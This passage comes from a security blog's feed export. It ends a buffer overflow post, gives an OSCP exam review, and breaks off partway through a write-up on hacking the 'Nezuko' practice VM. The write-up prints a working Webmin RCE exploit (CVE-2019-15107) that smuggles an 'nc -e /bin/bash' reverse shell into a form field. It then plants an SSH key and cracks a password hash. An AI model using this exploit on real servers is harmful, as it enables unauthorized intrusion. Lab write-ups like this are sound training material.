+&lt;p&gt;This is the easiest form of buffer overflow, if you are still wondering what is &lt;strong&gt;EIP&lt;/strong&gt;, &lt;strong&gt;ESP&lt;/strong&gt; , &lt;strong&gt;JMP ESP&lt;/strong&gt; etc.. it’s best if you start searching about them online to get a good grasp on the concept demonstrated above.&lt;/p&gt;
+
+&lt;p&gt;Thanks and Happy New Year!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/newyear.gif&quot; alt=&quot;ny&quot; /&gt;&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">It is time to play with the most simplest form of binary exploitation, vanilla EIP overwrite buffer overflow with no stack protection.</summary></entry><entry><title type="html">From script kiddie to advanced script kiddie : OSCP bedtime story</title><link href="http://localhost:4000/musubi/others/oscpreview" rel="alternate" type="text/html" title="From script kiddie to advanced script kiddie : OSCP bedtime story" /><published>2019-09-15T00:00:00+08:00</published><updated>2019-09-15T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSCP_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/oscpreview">&lt;p&gt;Hi guys, what’s up. Few days ago I just received a mail from Offsec saying that I have passed the Offensive Security Certified Professional(OSCP) exam.&lt;/p&gt;
+
+&lt;p&gt;Since I have some time to kill, I will share the journey and preparations that I took before I decided to take OSCP exam and also I will share my labs and exam experiences. This post will be quite different compared to my OSWP &lt;a href=&quot;https://yunaranyancat.github.io/musubi/others/oswpreview&quot;&gt;review&lt;/a&gt; as I won’t put much details on the course (there are lots of OSCP reviews that explain what is OSCP, what are the course pre requisites, who should take it, etc..) but rather I will explain on how I prepared myself before taking OSCP. Ok, enough for introduction, let’s delve deep into a script kiddie’s journey to become an OSCP holder.&lt;/p&gt;
+
+&lt;p&gt;I will divide different sections where I will call it as levels. These levels will indicate where I was, what were my skill sets at that time and what did I do to go to the next level..&lt;/p&gt;
+
+&lt;p&gt;Bear with me, it’s not a short journey..&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/hacker.jpeg&quot; alt=&quot;hacker_a_day&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;level-1-i-know-linux-but-i-dont-know-anything--know-a-little-bit-about-penetration-testing-time-spent--12-months&quot;&gt;Level 1 (I know Linux but I don’t know anything / know a little bit about penetration testing) [Time spent : 1~2 months]&lt;/h3&gt;
+
+&lt;p&gt;Hello there, I know we are all have been in this place. This is the moment right after we have decided to dive deep into the world of penetration testing, or I would say, ethical hacking.&lt;/p&gt;
+
+&lt;p&gt;This is the moment where we got frustrated whenever we fail to understand anything.. the moment where, whenever we wanted to install some distros or some hacking tools but failed, we just paste the error in the forum or a facebook group and ask the pros, “hi there, can anyone help me?”, in hope of someone will help and maybe tell us something like, “why don’t you read the error from the terminal and then try to search what the error says online?” ; but instead we got told “try harder”, “google is your friend” or even a sad facebook emoji reaction with no replies. It’s okay. It’s totally fine. It’s not that they don’t want to help you.&lt;/p&gt;
+
+&lt;p&gt;Maybe it is another way of teaching you and making you think and realize that, “Let’s imagine that you are currently taking OSCP exam and you don’t know what to do.. do you ask directly for someone else help? No, you won’t, and you can’t.”&lt;/p&gt;
+
+&lt;p&gt;You need to find your way in and out, you need to find an entry point, you need to google every term that you know and that is when you will understand what do they mean by &lt;strong&gt;google is your friend&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/desperation.jpeg&quot; alt=&quot;desperation&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When I was at this level, I bought a book titled &lt;strong&gt;Penetration Testing: A Hands-On Introduction to Hacking&lt;/strong&gt; by Georgia Weidman.&lt;/p&gt;
+
+&lt;p&gt;After that, I started playing &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;HackTheBox&lt;/a&gt;, which my first machine was &lt;a href=&quot;https://www.youtube.com/watch?v=PJeBIey8gc4&quot;&gt;Jerry&lt;/a&gt; (Jerry has just got retired when I wanted to try it, I think around early December). At that time, I was pretty happy to get a shell eventhough I was just replicating everything what &lt;a href=&quot;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&quot;&gt;Ippsec&lt;/a&gt; did.&lt;/p&gt;
+
+&lt;h3 id=&quot;level-2-i-know-what-is-pentest-but-i-still-need-to-make-myself-comfortable-with-hacking-or-boot-to-root-ctf-style-time-spent--as-long-as-it-should-take&quot;&gt;Level 2 (I know what is pentest but I still need to make myself comfortable with hacking or boot-to-root CTF style) [Time spent : As long as it should take]&lt;/h3&gt;
+
+&lt;p&gt;This is where I spent most of my time playing HTB, met a lot of new friends, shared and exchanged lots of knowledge, joined lots of groups.. and after a month playing HTB, I managed to obtain a &lt;strong&gt;Guru&lt;/strong&gt; rank from &lt;strong&gt;script kiddie&lt;/strong&gt; rank (I was really close to &lt;strong&gt;Omniscient&lt;/strong&gt; as I managed to root all of the active machines at that time but I was stuck at binary exploitation challenges, because, you know… which script kiddie can do binary exploitation? &lt;strong&gt;(&amp;gt;_&amp;lt;)&lt;/strong&gt; ) ..&lt;/p&gt;
+
+&lt;p&gt;Other than that, sometimes I spent my time playing with other CTF sites such as root-me, rankkk, and etc.. but, HTB is number one in my heart. ☆⌒(ゝ。∂)&lt;/p&gt;
+
+&lt;p&gt;Check out my &lt;a href=&quot;https://www.wechall.net/profile/y4t0&quot;&gt;wechall&lt;/a&gt; profile for more info.&lt;/p&gt;
+
+&lt;h3 id=&quot;level-3-i-think-i-know-how-to-root-a-machine-but-now-i-need-to-focus-more-on-oscp-style-machines-time-spent--1-month&quot;&gt;Level 3 (I think I know how to root a machine but now I need to focus more on OSCP style machines) [Time spent : 1 month]&lt;/h3&gt;
+
+&lt;p&gt;I know I know, it’s the infamous OSCP like HTB machines list created by &lt;a href=&quot;https://twitter.com/TJ_Null&quot;&gt;TJnull&lt;/a&gt;.. Hehehe.. So, at this point, I started to do one by one based on that list.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/oscplike.jpg&quot; alt=&quot;oscplike&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay, these are my tips and tricks on how to gain the most of knowledge for every box that is on the list. (Not just for OSCP)&lt;/p&gt;
+
+&lt;p&gt;First, I will enumerate the machine by myself. What do I mean by that is I will try to find running services and then, I will enumerate the service that I know at that time. When I’m stuck or when I run out of ideas, only then would I watch Ippsec videos but I will &lt;strong&gt;ONLY&lt;/strong&gt; watch the PART where I was stuck.&lt;/p&gt;
+
+&lt;p&gt;After that,  I paused the video then proceed my enumeration and then repeat the methods until I have managed to root the machine. This will give me new enumeration and exploitation ideas or techniques which I can try to use them on other boxes later on.&lt;/p&gt;
+
+&lt;p&gt;After I have rooted a machine, I re-watched Ippsec videos about that machine , again, without pausing. This is the moment where I wanted to know how he did it and what’s different than what I did and how can I improve my enumeration techniques. The special thing about his videos is he didn’t root it only one way, but he also will try to find another way of enumerating the machine. (This also can be done by reading different writeups available online).&lt;/p&gt;
+
+&lt;p&gt;And the last cycle is optional, re-root the machine without any help. (Practice what you just learned + what you already know)&lt;/p&gt;
+
+&lt;p&gt;I can say that I’m pretty good with Linux machines, so I spent more time on Windows boxes. I learned about Windows environment, such as file transfers, system information, services and others that might give me the idea on how to find vulnerabilities in Windows machine.&lt;/p&gt;
+
+&lt;h3 id=&quot;level-4-im-pretty-confident-to-take-oscp-exam-time-spent--1-month&quot;&gt;Level 4 (I’m pretty confident to take OSCP exam) [Time spent : 1 month]&lt;/h3&gt;
+
+&lt;p&gt;I then booked the labs for 30 days, then scheduled the exam a week before my lab time finished (I’m scared that if I waited too long, I may end up procrastinating). Since I was pretty comfortable with my enumeration (to a comfortable level), I didn’t play much in the labs. I only used the labs to practice my buffer overflow techniques.&lt;/p&gt;
+
+&lt;p&gt;At first, I have decided to focus only on the buffer overflow part on the last week before the exam started, however, when I realized that the buffer overflow part was pretty easy to replicate, it boosted my confidence and that is when I decided to rescheduled my exam to be another week earlier than scheduled.&lt;/p&gt;
+
+&lt;h3 id=&quot;level--oscp-exam-time-spent--24-hours&quot;&gt;Level ??? (OSCP exam) [Time spent : 24 hours++]&lt;/h3&gt;
+
+&lt;p&gt;Targets :
+Few machines with one of them is the buffer overflow thingy..&lt;/p&gt;
+
+&lt;p&gt;The exam started at 11PM (Normally I’m already sound asleep at this time). I have prepared three cans of Redbull beside me just in case my eyes won’t open when I wanted it to.. :3&lt;/p&gt;
+
+&lt;p&gt;So, my strategy was like this :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Tackle buffer overflow machine first as it is the easiest one, for me. :&amp;gt;&lt;/li&gt;
+  &lt;li&gt;While doing Bof, run &lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;nmapautomator&lt;/a&gt; for the other machines and come back later to run a more thorough manual scans. (nikto, gobuster, nmap scripts scan etc..)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;It took me around two hours to complete the buffer overflow part. I did it slow and steady so that I will know where are the errors just in case the exploit didn’t work. Once I have finished the buffer overflow part, I focused on my scan results for other machines.&lt;/p&gt;
+
+&lt;p&gt;My standard enumeration + exploitation techniques would be ;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Identify open ports and what are the running services.&lt;/li&gt;
+  &lt;li&gt;Find the version of the running services and compare it to the latest version available online. If the version is quite old, then there’s a possibility that it is an entry point into the target.&lt;/li&gt;
+  &lt;li&gt;Read the exploits that are related to the running services and understand how it can be exploited.&lt;/li&gt;
+  &lt;li&gt;Repeat step 2-3 until you have identified some ports that could be your entry point (some low priv shell or even a root shell ) with different list of possible vulnerabilities.&lt;/li&gt;
+  &lt;li&gt;Rabbit holes : IMHO, rabbit holes only exist if you ;
+    &lt;ul&gt;
+      &lt;li&gt;Do not understand how the exploits work (If you know how they work but when you run them against that particular service then nothing happened, then move on to different services/ports, that service might not be vulnerable even though it’s version is vulnerable.. we can assume that it has been patched)&lt;/li&gt;
+      &lt;li&gt;Keep running the exploit again and again without modifying the exploit code hoping that it will work (Insanity is about doing the same thing over and over again and expecting different results.. The key is to understand what and why it’s not working.)&lt;/li&gt;
+      &lt;li&gt;Panic and suddenly forgetting every simple enumeration technique that you have learned. (Keep calm and go through your enumeration slowly, one by one. No one will ever know what’s waiting ahead, so keep enumerating..)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;If all of the above didn’t work, then check back :
+    &lt;ul&gt;
+      &lt;li&gt;Your scan results (Have you scanned all ports? TCP or UDP? )&lt;/li&gt;
+      &lt;li&gt;Did you forget something / enumerating each port that is open? If you are paranoid like me , you can use this &lt;a href=&quot;http://www.0daysecurity.com/penetration-testing/enumeration.html&quot;&gt;list&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;Did you forget to modify the exploits to fit your target environment? (ports? protocols? path? version? command? or even running Operating System?)&lt;/li&gt;
+      &lt;li&gt;Did you forget to take A REST? A quick nap or even few minutes of break could help you get back in the game.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Profit&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Extra note :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Metasploit usage&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Some of you might find that using Metasploit would be rewarding, however that wasn’t my case.&lt;/p&gt;
+
+&lt;p&gt;12 hours passed and I have rooted all of the machines except for one machine, which was one of the highest points machine and I only got a normal user shell (low privilege). Since I was very frustrated that my exploits didn’t work + I’m so tired and sleepy (I have only slept for 3 hours in total during my exam day ; &lt;strong&gt;1 hour&lt;/strong&gt; during the midnight, &lt;strong&gt;1 hour&lt;/strong&gt; during the early morning and another &lt;strong&gt;1 hour&lt;/strong&gt; in the evening), I went into &lt;del&gt;rage&lt;/del&gt; script kiddie mode.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/noob.jpeg&quot; alt=&quot;noob&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I then upgraded my shell into a Meterpreter session hoping that &lt;strong&gt;local exploit suggester&lt;/strong&gt; in Metasploit would work. However, I found nothing. Nothing at all. Not even a tiny bit of clue popped up after I have used my supposedly Metasploit “allowance” . Then I realized that I forgot to do something, one of the most important things to do for everyone especially for those who are taking the exam; &lt;strong&gt;I FORGOT TO TAKE A REST&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/meterpreter.jpeg&quot; alt=&quot;meterpreter&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, I went out for lunch with my friends and then I started to calm down. After that, I enumerated the machine slowly and carefully using my low priv shell, and then, I found an entry point. It was just right in front of my eyes. I didn’t know how could I have missed it. Then, after few modifications to the exploit code, I managed to get a root shell! Wohooo.. 100 points my boi..&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/chikadance.gif&quot; alt=&quot;chika&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;report&quot;&gt;Report&lt;/h3&gt;
+
+&lt;p&gt;Hah! You thought that the suffering has ended don’t ya? Yeah, it actually has ended. Now, for most of us, it’s a calmer moment. I used this report &lt;a href=&quot;https://github.com/whoisflynn/OSCP-Exam-Report-Template&quot;&gt;template&lt;/a&gt; then submitted my report on the next day early morning.&lt;/p&gt;
+
+&lt;h3 id=&quot;fin&quot;&gt;Fin&lt;/h3&gt;
+
+&lt;p&gt;Few days later, I got a mail telling that I have passed the OSCP exam. Another good news, I slept very well that night.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/sleep.gif&quot; alt=&quot;chika&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;tldri-hate-weebs&quot;&gt;TL;DR;I hate weebs;&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Pre-OSCP&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;a. Penetration Testing: A Hands-On Introduction to Hacking (Georgia Weidman)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/gw.jpg&quot; alt=&quot;gw&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;b. TJnull HackTheBox OSCP like machines list&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oscp/oscplike.jpg&quot; alt=&quot;oscplike2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;OSCP&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;nmapautomator&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;0 day security &lt;a href=&quot;http://www.0daysecurity.com/penetration-testing/enumeration.html&quot;&gt;checklist&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits&quot;&gt;secwiki&lt;/a&gt; Windows kernel exploits&lt;/li&gt;
+  &lt;li&gt;g0tmi1k linux privilege &lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;escalation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;sushant747 windows privilege &lt;a href=&quot;https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html&quot;&gt;escalation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Hi guys, what’s up. Few days ago I just received a mail from Offsec saying that I have passed the Offensive Security Certified Professional(OSCP) exam.</summary></entry><entry><title type="html">VM Nezuko Boot2Root Writeup</title><link href="http://localhost:4000/musubi/others/vm_nezuko" rel="alternate" type="text/html" title="VM Nezuko Boot2Root Writeup" /><published>2019-08-21T00:00:00+08:00</published><updated>2019-08-21T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/vm_nezuko_writeup</id><content type="html" xml:base="http://localhost:4000/musubi/others/vm_nezuko">&lt;p&gt;Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the &lt;a href=&quot;https://www.vulnhub.com/entry/nezuko-1,352/&quot;&gt;vm&lt;/a&gt; and come back when you have finished.&lt;/p&gt;
+
+&lt;h3 id=&quot;about-nezuko-vm&quot;&gt;About Nezuko VM&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/nezukovm.png&quot; alt=&quot;nezukovm&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I would consider this as an easy to intermediate level machine. But, if you need some hints, do reach me on &lt;a href=&quot;htttps://twitter.com/yunaranyancat&quot;&gt;Twitter&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Let’s assume that we put our attacking machine (Kali) and Nezuko VM inside the same subnet which is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.0/24&lt;/code&gt; .
+Therefore, by running &lt;code class=&quot;highlighter-rouge&quot;&gt;netdiscover -i eth0 -r 10.10.10.0/24&lt;/code&gt; , we will find out that Nezuko vm is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.4&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;p/s : the Kali vm has an IP of &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.5&lt;/code&gt; . This is useful for us to create a reverse shell later.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/netdiscover.png&quot; alt=&quot;netdiscover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By running &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sS -sC -sV -oA nezukocommon 10.10.10.4&lt;/code&gt; , we will get the following output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/nmapcommon.png&quot; alt=&quot;nmapcommon&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, let’s go to the webpage of &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.4&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/nezukowebpage.png&quot; alt=&quot;nezukowebpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing interesting except for nezuko chan.. ಥ ⌣ ಥ&lt;/p&gt;
+
+&lt;p&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.4/robots.txt&lt;/code&gt; , we will find an encoded text there.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/robotswebpage.png&quot; alt=&quot;robotswebpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The text is encoded with base32. Using online decoder such as this &lt;a href=&quot;https://emn178.github.io/online-tools/base32_decode.html&quot;&gt;site&lt;/a&gt; , we will get below plaintext.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/base32_decoded.png&quot; alt=&quot;base32_decoded&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since we got a hint from nezuko saying this is not the right port to enumerate. We will run an nmap scan again now to scan all ports.&lt;/p&gt;
+
+&lt;p&gt;Note : By default, nmap will only scan for common 1000 ports. You can check the specific ports that nmap scans using the default scan on this &lt;a href=&quot;https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/&quot;&gt;site&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;By running &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sS -sC -sV -p- -oA nezukoallports 10.10.10.4&lt;/code&gt; , we will get below output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/nmapallports.png&quot; alt=&quot;nmapallports&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems that port &lt;code class=&quot;highlighter-rouge&quot;&gt;13337&lt;/code&gt; is running a &lt;code class=&quot;highlighter-rouge&quot;&gt;webmin&lt;/code&gt; service. This might be an entry point for us.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+
+&lt;p&gt;The target is running &lt;code class=&quot;highlighter-rouge&quot;&gt;webmin 1.920&lt;/code&gt; . After some searching for webmin vulnerabilities, we will find a remote code execution vulnerability related to this specific version of webmin.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47293&quot;&gt;https://www.exploit-db.com/exploits/47293&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/testexploit.png&quot; alt=&quot;testexploit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Another link will lead us to a Metasploit module. However, we will not be using Metasploit because it will ruin all of the fun.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47230&quot;&gt;https://www.exploit-db.com/exploits/47230&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/metasploit.png&quot; alt=&quot;metasploit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Copy the shell script (in the first link) to our Kali to test if the target is vulnerable to rce exploit or not.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/vulnerablecheck.png&quot; alt=&quot;vulnerablecheck&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So it seems that the target is vulnerable.&lt;/p&gt;
+
+&lt;p&gt;We will modify the test code so that we can get a shell from the machine.&lt;/p&gt;
+
+&lt;p&gt;Our final exploit code should look something like this.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exploit for RCE (CVE-2019-15107) on &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$URI&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+curl &lt;span class=&quot;nt&quot;&gt;-ks&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URI&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/password_change.cgi'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'user=wheel&amp;amp;pam=&amp;amp;expired=2&amp;amp;old=id|nc -e /bin/bash 10.10.10.5 1337 &amp;amp;new1=wheel&amp;amp;new2=wheel'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/x-www-form-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Referer: '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$URI&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/session_login.cgi'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Before running the exploit we should start our netcat listener on our Kali.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/listener_1337.png&quot; alt=&quot;listener_1337&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then run the exploit code,&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~#sh exploit.sh https://10.10.10.4:13337&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/nezuko_shell.png&quot; alt=&quot;nezuko_shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got a shell as nezuko!&lt;/p&gt;
+
+&lt;h3 id=&quot;optional-upgrade-to-ssh-session&quot;&gt;(Optional) Upgrade to SSH session&lt;/h3&gt;
+
+&lt;p&gt;We can obtain ssh session as nezuko by adding our public key to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/nezuko/.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;First we need to generate our own private and public SSH key.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~#ssh-keygen &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; rsa&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Save the key in our current working directory by putting a name when prompted for the filename, in this case, the filename will be &lt;code class=&quot;highlighter-rouge&quot;&gt;yunaranyancat&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Copy the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;yunaranyancat.pub&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/nezuko/.ssh/authorized_keys&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/ssh-keygen.png&quot; alt=&quot;ssh-keygen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/copytoauthkeys.png&quot; alt=&quot;copytoauthkeys&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After that we can ssh as nezuko using following command&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/sshprivate.png&quot; alt=&quot;sshprivate&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;changing-user-to-zenitsu&quot;&gt;Changing user to zenitsu&lt;/h3&gt;
+
+&lt;p&gt;We find out that &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; is readable and furthermore, it reveals &lt;code class=&quot;highlighter-rouge&quot;&gt;zenitsu&lt;/code&gt; password hash.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/etcpasswd.png&quot; alt=&quot;etcpasswd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can try to crack the hash using hashcat by typing following command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/copytocrack.png&quot; alt=&quot;copytocrack&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/examplehash.png&quot; alt=&quot;examplehash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And after waiting for a while, the hash has been cracked and stored inside file &lt;code class=&quot;highlighter-rouge&quot;&gt;cracked&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/cracked.png&quot; alt=&quot;cracked&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we got the password, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;meowmeow&lt;/code&gt; , we can su as &lt;code class=&quot;highlighter-rouge&quot;&gt;zenitsu&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nezuko@ubuntu:~#su zenitsu&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;and when prompted with password, put &lt;code class=&quot;highlighter-rouge&quot;&gt;meowmeow&lt;/code&gt; and then click enter.&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h3&gt;
+
+&lt;p&gt;As &lt;code class=&quot;highlighter-rouge&quot;&gt;nezuko&lt;/code&gt; user before, we found out that there is a folder named &lt;code class=&quot;highlighter-rouge&quot;&gt;from_zenitsu&lt;/code&gt; in the home directory and now as &lt;code class=&quot;highlighter-rouge&quot;&gt;zenitsu&lt;/code&gt;, we found a folder named &lt;code class=&quot;highlighter-rouge&quot;&gt;to_nezuko&lt;/code&gt;. Upon inspecting both folder, we can say that these directories;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;from_zenitsu : contains message sent by zenitsu every 5 minutes (based on the name of the messages)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
